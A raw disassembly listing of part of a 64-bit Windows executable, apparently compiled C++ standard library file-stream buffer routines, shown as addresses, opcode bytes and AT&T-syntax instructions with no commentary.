   1400063cd:	e9 bc 00 00 00       	jmp    0x14000648e
   1400063d2:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   1400063d7:	40 88 74 24 40       	mov    %sil,0x40(%rsp)
   1400063dc:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400063e1:	48 8d 57 74          	lea    0x74(%rdi),%rdx
   1400063e5:	48 8d 44 24 78       	lea    0x78(%rsp),%rax
   1400063ea:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400063ef:	4c 8d 4c 24 41       	lea    0x41(%rsp),%r9
   1400063f4:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   1400063f9:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400063fe:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140006403:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140006408:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000640d:	ff 15 1d 3d 00 00    	call   *0x3d1d(%rip)        # 0x14000a130
   140006413:	85 c0                	test   %eax,%eax
   140006415:	74 2a                	je     0x140006441
   140006417:	83 e8 01             	sub    $0x1,%eax
   14000641a:	74 25                	je     0x140006441
   14000641c:	83 f8 02             	cmp    $0x2,%eax
   14000641f:	75 68                	jne    0x140006489
   140006421:	0f be 4c 24 40       	movsbl 0x40(%rsp),%ecx
   140006426:	48 8b 97 80 00 00 00 	mov    0x80(%rdi),%rdx
   14000642d:	ff 15 85 40 00 00    	call   *0x4085(%rip)        # 0x14000a4b8
   140006433:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140006438:	3b c1                	cmp    %ecx,%eax
   14000643a:	0f 45 ce             	cmovne %esi,%ecx
   14000643d:	8b c1                	mov    %ecx,%eax
   14000643f:	eb 4d                	jmp    0x14000648e
   140006441:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   140006446:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   14000644b:	48 2b d8             	sub    %rax,%rbx
   14000644e:	74 1f                	je     0x14000646f
   140006450:	4c 8b 8f 80 00 00 00 	mov    0x80(%rdi),%r9
   140006457:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   14000645c:	4c 8b c3             	mov    %rbx,%r8
   14000645f:	ba 01 00 00 00       	mov    $0x1,%edx
   140006464:	ff 15 86 40 00 00    	call   *0x4086(%rip)        # 0x14000a4f0
   14000646a:	48 3b d8             	cmp    %rax,%rbx
   14000646d:	75 1a                	jne    0x140006489
   14000646f:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140006474:	c6 47 71 01          	movb   $0x1,0x71(%rdi)
   140006478:	48 39 44 24 50       	cmp    %rax,0x50(%rsp)
   14000647d:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140006482:	0f 45 ce             	cmovne %esi,%ecx
   140006485:	8b c1                	mov    %ecx,%eax
   140006487:	eb 05                	jmp    0x14000648e
   140006489:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000648e:	48 8b 9c 24 a0 00 00 	mov    0xa0(%rsp),%rbx
   140006495:	00 
   140006496:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   14000649b:	48 33 cc             	xor    %rsp,%rcx
   14000649e:	e8 cd 23 00 00       	call   0x140008870
   1400064a3:	48 8b b4 24 a8 00 00 	mov    0xa8(%rsp),%rsi
   1400064aa:	00 
   1400064ab:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   1400064b2:	5f                   	pop    %rdi
   1400064b3:	c3                   	ret
   1400064b4:	cc                   	int3
   1400064b5:	cc                   	int3
   1400064b6:	cc                   	int3
   1400064b7:	cc                   	int3
   1400064b8:	cc                   	int3
   1400064b9:	cc                   	int3
   1400064ba:	cc                   	int3
   1400064bb:	cc                   	int3
   1400064bc:	cc                   	int3
   1400064bd:	cc                   	int3
   1400064be:	cc                   	int3
   1400064bf:	cc                   	int3
   1400064c0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400064c5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   1400064ca:	56                   	push   %rsi
   1400064cb:	57                   	push   %rdi
   1400064cc:	41 57                	push   %r15
   1400064ce:	48 83 ec 20          	sub    $0x20,%rsp
   1400064d2:	f6 41 70 02          	testb  $0x2,0x70(%rcx)
   1400064d6:	8b ea                	mov    %edx,%ebp
   1400064d8:	48 8b f9             	mov    %rcx,%rdi
   1400064db:	0f 85 23 01 00 00    	jne    0x140006604
   1400064e1:	83 fa ff             	cmp    $0xffffffff,%edx
   1400064e4:	75 07                	jne    0x1400064ed
   1400064e6:	33 c0                	xor    %eax,%eax
   1400064e8:	e9 1c 01 00 00       	jmp    0x140006609
   1400064ed:	ff 15 8d 3c 00 00    	call   *0x3c8d(%rip)        # 0x14000a180
   1400064f3:	48 8b cf             	mov    %rdi,%rcx
   1400064f6:	48 8b d8             	mov    %rax,%rbx
   1400064f9:	ff 15 a1 3c 00 00    	call   *0x3ca1(%rip)        # 0x14000a1a0
   1400064ff:	48 8b f0             	mov    %rax,%rsi
   140006502:	48 85 db             	test   %rbx,%rbx
   140006505:	74 20                	je     0x140006527
   140006507:	48 3b d8             	cmp    %rax,%rbx
   14000650a:	73 1b                	jae    0x140006527
   14000650c:	48 8b cf             	mov    %rdi,%rcx
   14000650f:	ff 15 c3 3c 00 00    	call   *0x3cc3(%rip)        # 0x14000a1d8
   140006515:	40 88 28             	mov    %bpl,(%rax)
   140006518:	48 8d 43 01          	lea    0x1(%rbx),%rax
   14000651c:	48 89 47 68          	mov    %rax,0x68(%rdi)
   140006520:	8b c5                	mov    %ebp,%eax
   140006522:	e9 e2 00 00 00       	jmp    0x140006609
   140006527:	48 8b cf             	mov    %rdi,%rcx
   14000652a:	ff 15 38 3c 00 00    	call   *0x3c38(%rip)        # 0x14000a168
   140006530:	48 2b f0             	sub    %rax,%rsi
   140006533:	4c 8b f8             	mov    %rax,%r15
   140006536:	33 c0                	xor    %eax,%eax
   140006538:	48 85 db             	test   %rbx,%rbx
   14000653b:	48 0f 44 f0          	cmove  %rax,%rsi
   14000653f:	48 83 fe 20          	cmp    $0x20,%rsi
   140006543:	73 07                	jae    0x14000654c
   140006545:	bb 20 00 00 00       	mov    $0x20,%ebx
   14000654a:	eb 1d                	jmp    0x140006569
   14000654c:	48 81 fe ff ff ff 3f 	cmp    $0x3fffffff,%rsi
   140006553:	73 06                	jae    0x14000655b
   140006555:	48 8d 1c 36          	lea    (%rsi,%rsi,1),%rbx
   140006559:	eb 0e                	jmp    0x140006569
   14000655b:	bb ff ff ff 7f       	mov    $0x7fffffff,%ebx
   140006560:	48 3b f3             	cmp    %rbx,%rsi
   140006563:	0f 83 9b 00 00 00    	jae    0x140006604
   140006569:	48 8b cb             	mov    %rbx,%rcx
   14000656c:	4c 89 74 24 40       	mov    %r14,0x40(%rsp)
   140006571:	e8 4a ad ff ff       	call   0x1400012c0
   140006576:	4c 8b c6             	mov    %rsi,%r8
   140006579:	49 8b d7             	mov    %r15,%rdx
   14000657c:	48 8b c8             	mov    %rax,%rcx
   14000657f:	4c 8b f0             	mov    %rax,%r14
   140006582:	e8 bd 30 00 00       	call   0x140009644
   140006587:	4e 8d 04 36          	lea    (%rsi,%r14,1),%r8
   14000658b:	49 8b d6             	mov    %r14,%rdx
   14000658e:	49 8d 48 01          	lea    0x1(%r8),%rcx
   140006592:	48 89 4f 68          	mov    %rcx,0x68(%rdi)
   140006596:	4d 8d 0c 1e          	lea    (%r14,%rbx,1),%r9
   14000659a:	48 8b cf             	mov    %rdi,%rcx
   14000659d:	ff 15 2d 3c 00 00    	call   *0x3c2d(%rip)        # 0x14000a1d0
   1400065a3:	f6 47 70 04          	testb  $0x4,0x70(%rdi)
   1400065a7:	48 8b cf             	mov    %rdi,%rcx
   1400065aa:	74 08                	je     0x1400065b4
   1400065ac:	4d 8b ce             	mov    %r14,%r9
   1400065af:	4d 8b c6             	mov    %r14,%r8
   1400065b2:	eb 19                	jmp    0x1400065cd
   1400065b4:	48 8b 5f 68          	mov    0x68(%rdi),%rbx
   1400065b8:	ff 15 b2 3b 00 00    	call   *0x3bb2(%rip)        # 0x14000a170
   1400065be:	4d 8b c6             	mov    %r14,%r8
   1400065c1:	4c 8b cb             	mov    %rbx,%r9
   1400065c4:	4d 2b c7             	sub    %r15,%r8
   1400065c7:	48 8b cf             	mov    %rdi,%rcx
   1400065ca:	4c 03 c0             	add    %rax,%r8
   1400065cd:	49 8b d6             	mov    %r14,%rdx
   1400065d0:	ff 15 c2 3b 00 00    	call   *0x3bc2(%rip)        # 0x14000a198
   1400065d6:	f6 47 70 01          	testb  $0x1,0x70(%rdi)
   1400065da:	4c 8b 74 24 40       	mov    0x40(%rsp),%r14
   1400065df:	74 0f                	je     0x1400065f0
   1400065e1:	48 8d 4f 74          	lea    0x74(%rdi),%rcx
   1400065e5:	4c 8b c6             	mov    %rsi,%r8
   1400065e8:	49 8b d7             	mov    %r15,%rdx
   1400065eb:	e8 70 b8 ff ff       	call   0x140001e60
   1400065f0:	83 4f 70 01          	orl    $0x1,0x70(%rdi)
   1400065f4:	48 8b cf             	mov    %rdi,%rcx
   1400065f7:	ff 15 db 3b 00 00    	call   *0x3bdb(%rip)        # 0x14000a1d8
   1400065fd:	40 88 28             	mov    %bpl,(%rax)
   140006600:	8b c5                	mov    %ebp,%eax
   140006602:	eb 05                	jmp    0x140006609
   140006604:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140006609:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   14000660e:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   140006613:	48 83 c4 20          	add    $0x20,%rsp
   140006617:	41 5f                	pop    %r15
   140006619:	5f                   	pop    %rdi
   14000661a:	5e                   	pop    %rsi
   14000661b:	c3                   	ret
   14000661c:	cc                   	int3
   14000661d:	cc                   	int3
   14000661e:	cc                   	int3
   14000661f:	cc                   	int3
   140006620:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006625:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000662a:	57                   	push   %rdi
   14000662b:	48 83 ec 20          	sub    $0x20,%rsp
   14000662f:	8b f2                	mov    %edx,%esi
   140006631:	48 8b f9             	mov    %rcx,%rdi
   140006634:	ff 15 36 3b 00 00    	call   *0x3b36(%rip)        # 0x14000a170
   14000663a:	48 85 c0             	test   %rax,%rax
   14000663d:	74 53                	je     0x140006692
   14000663f:	48 8b cf             	mov    %rdi,%rcx
   140006642:	ff 15 20 3b 00 00    	call   *0x3b20(%rip)        # 0x14000a168
   140006648:	48 8b cf             	mov    %rdi,%rcx
   14000664b:	48 8b d8             	mov    %rax,%rbx
   14000664e:	ff 15 1c 3b 00 00    	call   *0x3b1c(%rip)        # 0x14000a170
   140006654:	48 3b d8             	cmp    %rax,%rbx
   140006657:	73 39                	jae    0x140006692
   140006659:	83 fe ff             	cmp    $0xffffffff,%esi
   14000665c:	74 11                	je     0x14000666f
   14000665e:	48 8b cf             	mov    %rdi,%rcx
   140006661:	ff 15 09 3b 00 00    	call   *0x3b09(%rip)        # 0x14000a170
   140006667:	0f b6 48 ff          	movzbl -0x1(%rax),%ecx
   14000666b:	3b ce                	cmp    %esi,%ecx
   14000666d:	75 23                	jne    0x140006692
   14000666f:	48 8b cf             	mov    %rdi,%rcx
   140006672:	ff 15 30 3b 00 00    	call   *0x3b30(%rip)        # 0x14000a1a8
   140006678:	33 c0                	xor    %eax,%eax
   14000667a:	83 fe ff             	cmp    $0xffffffff,%esi
   14000667d:	0f 44 f0             	cmove  %eax,%esi
   140006680:	8b c6                	mov    %esi,%eax
   140006682:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006687:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000668c:	48 83 c4 20          	add    $0x20,%rsp
   140006690:	5f                   	pop    %rdi
   140006691:	c3                   	ret
   140006692:	48 8b 97 80 00 00 00 	mov    0x80(%rdi),%rdx
   140006699:	48 85 d2             	test   %rdx,%rdx
   14000669c:	0f 84 83 00 00 00    	je     0x140006725
   1400066a2:	83 fe ff             	cmp    $0xffffffff,%esi
   1400066a5:	74 7e                	je     0x140006725
   1400066a7:	48 83 7f 68 00       	cmpq   $0x0,0x68(%rdi)
   1400066ac:	75 0f                	jne    0x1400066bd
   1400066ae:	40 0f b6 ce          	movzbl %sil,%ecx
   1400066b2:	ff 15 20 3e 00 00    	call   *0x3e20(%rip)        # 0x14000a4d8
   1400066b8:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400066bb:	75 c3                	jne    0x140006680
   1400066bd:	48 8b cf             	mov    %rdi,%rcx
   1400066c0:	48 8d 5f 70          	lea    0x70(%rdi),%rbx
   1400066c4:	ff 15 a6 3a 00 00    	call   *0x3aa6(%rip)        # 0x14000a170
   1400066ca:	48 3b c3             	cmp    %rbx,%rax
   1400066cd:	74 56                	je     0x140006725
   1400066cf:	48 8b cf             	mov    %rdi,%rcx
   1400066d2:	40 88 33             	mov    %sil,(%rbx)
   1400066d5:	ff 15 8d 3a 00 00    	call   *0x3a8d(%rip)        # 0x14000a168
   1400066db:	48 3b c3             	cmp    %rbx,%rax
   1400066de:	74 20                	je     0x140006700
   1400066e0:	48 8b cf             	mov    %rdi,%rcx
   1400066e3:	ff 15 7f 3a 00 00    	call   *0x3a7f(%rip)        # 0x14000a168
   1400066e9:	48 8b cf             	mov    %rdi,%rcx
   1400066ec:	48 89 87 88 00 00 00 	mov    %rax,0x88(%rdi)
   1400066f3:	ff 15 8f 3a 00 00    	call   *0x3a8f(%rip)        # 0x14000a188
   1400066f9:	48 89 87 90 00 00 00 	mov    %rax,0x90(%rdi)
   140006700:	4c 8d 4f 71          	lea    0x71(%rdi),%r9
   140006704:	4c 8b c3             	mov    %rbx,%r8
   140006707:	48 8b d3             	mov    %rbx,%rdx
   14000670a:	48 8b cf             	mov    %rdi,%rcx
   14000670d:	ff 15 85 3a 00 00    	call   *0x3a85(%rip)        # 0x14000a198
   140006713:	8b c6                	mov    %esi,%eax
   140006715:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000671a:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000671f:	48 83 c4 20          	add    $0x20,%rsp
   140006723:	5f                   	pop    %rdi
   140006724:	c3                   	ret
   140006725:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000672a:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000672f:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140006734:	48 83 c4 20          	add    $0x20,%rsp
   140006738:	5f                   	pop    %rdi
   140006739:	c3                   	ret
   14000673a:	cc                   	int3
   14000673b:	cc                   	int3
   14000673c:	cc                   	int3
   14000673d:	cc                   	int3
   14000673e:	cc                   	int3
   14000673f:	cc                   	int3
   140006740:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006745:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000674a:	57                   	push   %rdi
   14000674b:	48 83 ec 20          	sub    $0x20,%rsp
   14000674f:	8b da                	mov    %edx,%ebx
   140006751:	48 8b f9             	mov    %rcx,%rdi
   140006754:	ff 15 16 3a 00 00    	call   *0x3a16(%rip)        # 0x14000a170
   14000675a:	48 8b f0             	mov    %rax,%rsi
   14000675d:	48 85 c0             	test   %rax,%rax
   140006760:	74 56                	je     0x1400067b8
   140006762:	48 8b cf             	mov    %rdi,%rcx
   140006765:	ff 15 fd 39 00 00    	call   *0x39fd(%rip)        # 0x14000a168
   14000676b:	48 3b f0             	cmp    %rax,%rsi
   14000676e:	76 48                	jbe    0x1400067b8
   140006770:	83 fb ff             	cmp    $0xffffffff,%ebx
   140006773:	74 0b                	je     0x140006780
   140006775:	3a 5e ff             	cmp    -0x1(%rsi),%bl
   140006778:	74 06                	je     0x140006780
   14000677a:	f6 47 70 02          	testb  $0x2,0x70(%rdi)
   14000677e:	75 38                	jne    0x1400067b8
   140006780:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   140006785:	48 8b cf             	mov    %rdi,%rcx
   140006788:	ff 15 02 3a 00 00    	call   *0x3a02(%rip)        # 0x14000a190
   14000678e:	83 fb ff             	cmp    $0xffffffff,%ebx
   140006791:	74 0b                	je     0x14000679e
   140006793:	48 8b cf             	mov    %rdi,%rcx
   140006796:	ff 15 d4 39 00 00    	call   *0x39d4(%rip)        # 0x14000a170
   14000679c:	88 18                	mov    %bl,(%rax)
   14000679e:	33 c0                	xor    %eax,%eax
   1400067a0:	83 fb ff             	cmp    $0xffffffff,%ebx
   1400067a3:	0f 44 d8             	cmove  %eax,%ebx
   1400067a6:	8b c3                	mov    %ebx,%eax
   1400067a8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400067ad:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400067b2:	48 83 c4 20          	add    $0x20,%rsp
   1400067b6:	5f                   	pop    %rdi
   1400067b7:	c3                   	ret
   1400067b8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400067bd:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400067c2:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400067c7:	48 83 c4 20          	add    $0x20,%rsp
   1400067cb:	5f                   	pop    %rdi
   1400067cc:	c3                   	ret
   1400067cd:	cc                   	int3
   1400067ce:	cc                   	int3
   1400067cf:	cc                   	int3
   1400067d0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400067d5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   1400067da:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400067df:	57                   	push   %rdi
   1400067e0:	48 83 ec 20          	sub    $0x20,%rsp
   1400067e4:	41 8b e9             	mov    %r9d,%ebp
   1400067e7:	49 8b f0             	mov    %r8,%rsi
   1400067ea:	48 8b da             	mov    %rdx,%rbx
   1400067ed:	48 8b f9             	mov    %rcx,%rdi
   1400067f0:	ff 15 7a 39 00 00    	call   *0x397a(%rip)        # 0x14000a170
   1400067f6:	4c 8d 57 70          	lea    0x70(%rdi),%r10
   1400067fa:	49 3b c2             	cmp    %r10,%rax
   1400067fd:	75 0f                	jne    0x14000680e
   1400067ff:	83 fd 01             	cmp    $0x1,%ebp
   140006802:	75 0a                	jne    0x14000680e
   140006804:	48 83 7f 68 00       	cmpq   $0x0,0x68(%rdi)
   140006809:	75 03                	jne    0x14000680e
   14000680b:	48 ff ce             	dec    %rsi
   14000680e:	48 83 bf 80 00 00 00 	cmpq   $0x0,0x80(%rdi)
   140006815:	00 
   140006816:	74 65                	je     0x14000687d
   140006818:	48 8b cf             	mov    %rdi,%rcx
   14000681b:	e8 00 f6 ff ff       	call   0x140005e20
   140006820:	84 c0                	test   %al,%al
   140006822:	74 59                	je     0x14000687d
   140006824:	48 85 f6             	test   %rsi,%rsi
   140006827:	75 05                	jne    0x14000682e
   140006829:	83 fd 01             	cmp    $0x1,%ebp
   14000682c:	74 17                	je     0x140006845
   14000682e:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   140006835:	44 8b c5             	mov    %ebp,%r8d
   140006838:	48 8b d6             	mov    %rsi,%rdx
   14000683b:	ff 15 8f 3c 00 00    	call   *0x3c8f(%rip)        # 0x14000a4d0
   140006841:	85 c0                	test   %eax,%eax
   140006843:	75 38                	jne    0x14000687d
   140006845:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   14000684c:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140006851:	ff 15 49 3c 00 00    	call   *0x3c49(%rip)        # 0x14000a4a0
   140006857:	85 c0                	test   %eax,%eax
   140006859:	75 22                	jne    0x14000687d
   14000685b:	48 8b cf             	mov    %rdi,%rcx
   14000685e:	e8 cd f6 ff ff       	call   0x140005f30
   140006863:	48 8b 4f 74          	mov    0x74(%rdi),%rcx
   140006867:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   14000686c:	48 89 03             	mov    %rax,(%rbx)
   14000686f:	48 89 4b 10          	mov    %rcx,0x10(%rbx)
   140006873:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   14000687a:	00 
   14000687b:	eb 15                	jmp    0x140006892
   14000687d:	33 c0                	xor    %eax,%eax
   14000687f:	48 c7 03 ff ff ff ff 	movq   $0xffffffffffffffff,(%rbx)
   140006886:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   14000688d:	00 
   14000688e:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140006892:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   140006897:	48 8b c3             	mov    %rbx,%rax
   14000689a:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   14000689f:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   1400068a4:	48 83 c4 20          	add    $0x20,%rsp
   1400068a8:	5f                   	pop    %rdi
   1400068a9:	c3                   	ret
   1400068aa:	cc                   	int3
   1400068ab:	cc                   	int3
   1400068ac:	cc                   	int3
   1400068ad:	cc                   	int3
   1400068ae:	cc                   	int3
   1400068af:	cc                   	int3
   1400068b0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400068b5:	55                   	push   %rbp
   1400068b6:	56                   	push   %rsi
   1400068b7:	57                   	push   %rdi
   1400068b8:	41 54                	push   %r12
   1400068ba:	41 57                	push   %r15
   1400068bc:	48 83 ec 20          	sub    $0x20,%rsp
   1400068c0:	8b 74 24 70          	mov    0x70(%rsp),%esi
   1400068c4:	45 8b f9             	mov    %r9d,%r15d
   1400068c7:	4d 8b e0             	mov    %r8,%r12
   1400068ca:	48 8b fa             	mov    %rdx,%rdi
   1400068cd:	48 8b e9             	mov    %rcx,%rbp
   1400068d0:	40 f6 c6 01          	test   $0x1,%sil
   1400068d4:	74 0a                	je     0x1400068e0
   1400068d6:	f6 41 70 04          	testb  $0x4,0x70(%rcx)
   1400068da:	74 04                	je     0x1400068e0
   1400068dc:	b1 01                	mov    $0x1,%cl
   1400068de:	eb 02                	jmp    0x1400068e2
   1400068e0:	32 c9                	xor    %cl,%cl
   1400068e2:	40 f6 c6 02          	test   $0x2,%sil
   1400068e6:	74 0a                	je     0x1400068f2
   1400068e8:	f6 45 70 02          	testb  $0x2,0x70(%rbp)
   1400068ec:	74 04                	je     0x1400068f2
   1400068ee:	b0 01                	mov    $0x1,%al
   1400068f0:	eb 02                	jmp    0x1400068f4
   1400068f2:	32 c0                	xor    %al,%al
   1400068f4:	4c 89 6c 24 50       	mov    %r13,0x50(%rsp)
   1400068f9:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   1400068fe:	84 c9                	test   %cl,%cl
   140006900:	0f 85 1e 01 00 00    	jne    0x140006a24
   140006906:	84 c0                	test   %al,%al
   140006908:	0f 85 16 01 00 00    	jne    0x140006a24
   14000690e:	48 8b cd             	mov    %rbp,%rcx
   140006911:	ff 15 59 38 00 00    	call   *0x3859(%rip)        # 0x14000a170
   140006917:	f6 45 70 02          	testb  $0x2,0x70(%rbp)
   14000691b:	4c 8b e8             	mov    %rax,%r13
   14000691e:	74 04                	je     0x140006924
   140006920:	33 db                	xor    %ebx,%ebx
   140006922:	eb 1b                	jmp    0x14000693f
   140006924:	48 8b cd             	mov    %rbp,%rcx
   140006927:	ff 15 53 38 00 00    	call   *0x3853(%rip)        # 0x14000a180
   14000692d:	48 8b d8             	mov    %rax,%rbx
   140006930:	48 85 c0             	test   %rax,%rax
   140006933:	74 0a                	je     0x14000693f
   140006935:	48 39 45 68          	cmp    %rax,0x68(%rbp)
   140006939:	73 04                	jae    0x14000693f
   14000693b:	48 89 45 68          	mov    %rax,0x68(%rbp)
   14000693f:	48 8b cd             	mov    %rbp,%rcx
   140006942:	ff 15 20 38 00 00    	call   *0x3820(%rip)        # 0x14000a168
   140006948:	48 8b 55 68          	mov    0x68(%rbp),%rdx
   14000694c:	4c 8b f0             	mov    %rax,%r14
   14000694f:	48 2b d0             	sub    %rax,%rdx
   140006952:	45 85 ff             	test   %r15d,%r15d
   140006955:	74 5a                	je     0x1400069b1
   140006957:	41 83 ef 01          	sub    $0x1,%r15d
   14000695b:	74 0f                	je     0x14000696c
   14000695d:	41 83 ff 01          	cmp    $0x1,%r15d
   140006961:	0f 85 bd 00 00 00    	jne    0x140006a24
   140006967:	48 8b c2             	mov    %rdx,%rax
   14000696a:	eb 47                	jmp    0x1400069b3
   14000696c:	8b c6                	mov    %esi,%eax
   14000696e:	83 e0 03             	and    $0x3,%eax
   140006971:	3c 03                	cmp    $0x3,%al
   140006973:	0f 84 ab 00 00 00    	je     0x140006a24
   140006979:	40 f6 c6 01          	test   $0x1,%sil
   14000697d:	74 16                	je     0x140006995
   14000697f:	4d 85 ed             	test   %r13,%r13
   140006982:	75 09                	jne    0x14000698d
   140006984:	4d 85 f6             	test   %r14,%r14
   140006987:	0f 85 97 00 00 00    	jne    0x140006a24
   14000698d:	49 8b c5             	mov    %r13,%rax
   140006990:	49 2b c6             	sub    %r14,%rax
   140006993:	eb 1e                	jmp    0x1400069b3
   140006995:	40 f6 c6 02          	test   $0x2,%sil
   140006999:	0f 84 85 00 00 00    	je     0x140006a24
   14000699f:	48 85 db             	test   %rbx,%rbx
   1400069a2:	75 05                	jne    0x1400069a9
   1400069a4:	4d 85 f6             	test   %r14,%r14
   1400069a7:	75 7b                	jne    0x140006a24
   1400069a9:	48 8b c3             	mov    %rbx,%rax
   1400069ac:	49 2b c6             	sub    %r14,%rax
   1400069af:	eb 02                	jmp    0x1400069b3
   1400069b1:	33 c0                	xor    %eax,%eax
   1400069b3:	4e 8d 3c 20          	lea    (%rax,%r12,1),%r15
   1400069b7:	4c 3b fa             	cmp    %rdx,%r15
   1400069ba:	77 68                	ja     0x140006a24
   1400069bc:	4d 85 ff             	test   %r15,%r15
   1400069bf:	74 16                	je     0x1400069d7
   1400069c1:	40 f6 c6 01          	test   $0x1,%sil
   1400069c5:	74 05                	je     0x1400069cc
   1400069c7:	4d 85 ed             	test   %r13,%r13
   1400069ca:	74 58                	je     0x140006a24
   1400069cc:	40 f6 c6 02          	test   $0x2,%sil
   1400069d0:	74 05                	je     0x1400069d7
   1400069d2:	48 85 db             	test   %rbx,%rbx
   1400069d5:	74 4d                	je     0x140006a24
   1400069d7:	4f 8d 24 37          	lea    (%r15,%r14,1),%r12
   1400069db:	40 f6 c6 01          	test   $0x1,%sil
   1400069df:	74 18                	je     0x1400069f9
   1400069e1:	4d 85 ed             	test   %r13,%r13
   1400069e4:	74 13                	je     0x1400069f9
   1400069e6:	4c 8b 4d 68          	mov    0x68(%rbp),%r9
   1400069ea:	4d 8b c4             	mov    %r12,%r8
   1400069ed:	49 8b d6             	mov    %r14,%rdx
   1400069f0:	48 8b cd             	mov    %rbp,%rcx
   1400069f3:	ff 15 9f 37 00 00    	call   *0x379f(%rip)        # 0x14000a198
   1400069f9:	40 f6 c6 02          	test   $0x2,%sil
   1400069fd:	74 20                	je     0x140006a1f
   1400069ff:	48 85 db             	test   %rbx,%rbx
   140006a02:	74 1b                	je     0x140006a1f
   140006a04:	48 8b cd             	mov    %rbp,%rcx
   140006a07:	ff 15 93 37 00 00    	call   *0x3793(%rip)        # 0x14000a1a0
   140006a0d:	4d 8b c4             	mov    %r12,%r8
   140006a10:	49 8b d6             	mov    %r14,%rdx
   140006a13:	4c 8b c8             	mov    %rax,%r9
   140006a16:	48 8b cd             	mov    %rbp,%rcx
   140006a19:	ff 15 b1 37 00 00    	call   *0x37b1(%rip)        # 0x14000a1d0
   140006a1f:	4c 89 3f             	mov    %r15,(%rdi)
   140006a22:	eb 07                	jmp    0x140006a2b
   140006a24:	48 c7 07 ff ff ff ff 	movq   $0xffffffffffffffff,(%rdi)
   140006a2b:	4c 8b 74 24 58       	mov    0x58(%rsp),%r14
   140006a30:	33 c0                	xor    %eax,%eax
   140006a32:	4c 8b 6c 24 50       	mov    0x50(%rsp),%r13
   140006a37:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140006a3c:	48 c7 47 08 00 00 00 	movq   $0x0,0x8(%rdi)
   140006a43:	00 
   140006a44:	48 89 47 10          	mov    %rax,0x10(%rdi)
   140006a48:	48 8b c7             	mov    %rdi,%rax
   140006a4b:	48 83 c4 20          	add    $0x20,%rsp
   140006a4f:	41 5f                	pop    %r15
   140006a51:	41 5c                	pop    %r12
   140006a53:	5f                   	pop    %rdi
   140006a54:	5e                   	pop    %rsi
   140006a55:	5d                   	pop    %rbp
   140006a56:	c3                   	ret
   140006a57:	cc                   	int3
   140006a58:	cc                   	int3
   140006a59:	cc                   	int3
   140006a5a:	cc                   	int3
   140006a5b:	cc                   	int3
   140006a5c:	cc                   	int3
   140006a5d:	cc                   	int3
   140006a5e:	cc                   	int3
   140006a5f:	cc                   	int3
   140006a60:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140006a65:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140006a6a:	57                   	push   %rdi
   140006a6b:	48 83 ec 20          	sub    $0x20,%rsp
   140006a6f:	49 8b 40 08          	mov    0x8(%r8),%rax
   140006a73:	49 8b f0             	mov    %r8,%rsi
   140006a76:	49 03 00             	add    (%r8),%rax
   140006a79:	48 8b da             	mov    %rdx,%rbx
   140006a7c:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   140006a83:	00 
   140006a84:	48 8b f9             	mov    %rcx,%rdi
   140006a87:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140006a8c:	74 5a                	je     0x140006ae8
   140006a8e:	e8 8d f3 ff ff       	call   0x140005e20
   140006a93:	84 c0                	test   %al,%al
   140006a95:	74 51                	je     0x140006ae8
